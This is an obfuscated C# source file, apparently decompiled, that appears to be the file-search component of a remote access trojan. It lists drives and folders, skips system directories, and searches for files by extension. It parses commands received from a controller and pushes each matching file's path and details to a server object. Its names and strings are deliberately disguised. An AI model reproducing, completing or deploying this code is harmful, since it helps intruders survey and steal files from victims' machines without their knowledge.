using System;
using System.Collections.Generic;
using System.IO;

namespace ntharprmes;

internal class DRZARIVF
{
	public int ntharprmesfIndx = 0;

	public bool ntharprmesreaging = false;

	public List<string> ntharprmessFiles = new List<string>();

	public MEADRM iserver;

	public List<string> ntharprmesfExts = new List<string>();

	public List<string> ntharprmesnotFilders = new List<string>();

	public string ntharprmesmainPath;

	public int ntharprmessIndx = 0;

	public string ntharprmesfilesLogs = CEAZRNF.ntharprmesfilesLogs;

	public IEnumerable<string> ntharprmesaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.ntharprmesautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (ntharprmesseeAccess(text) && !ntharprmesnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool ntharprmesseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void ntharprmeslookFiles(string tempStr)
	{
		iserver.ntharprmesautCnls = false;
		ntharprmesfExts.Clear();
		ntharprmessFiles.Clear();
		ntharprmesfIndx = 0;
		ntharprmessIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				ntharprmesfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			ntharprmesreaging = true;
			ntharprmessendSearch(array[1]);
			ntharprmesreaging = false;
			iserver.ntharprmespush_data(null, "ntharprmes-seard=searched|ntharprmes".Split(new char[1] { '|' })[0]);
		}
	}

	public DRZARIVF()
	{
		ntharprmesnotFilders.Add("clients_data|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("program files|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("system volume information|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("$recycle.bin|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("msocache|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("recoveDSDF|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("documents and settings|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("windows|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("program files (x86)|ntharprmes".Split(new char[1] { '|' })[0]);
		ntharprmesnotFilders.Add("programdata|ntharprmes".Split(new char[1] { '|' })[0]);
	}

	public string ntharprmescheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (ntharprmesseeAccess(text2))
				{
					text = text + text2 + ">|ntharprmes".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void ntharprmessendSearch(string path)
	{
		try
		{
			foreach (string item in ntharprmesaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (ntharprmesfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.ntharprmesfile_info(item, ret: true);
					iserver.ntharprmespush_data(null, "ntharprmes-searf=|ntharprmes".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|ntharprmes".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.ntharprmesautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string ntharprmeslookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|ntharprmes".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string ntharprmeslookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|ntharprmes".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
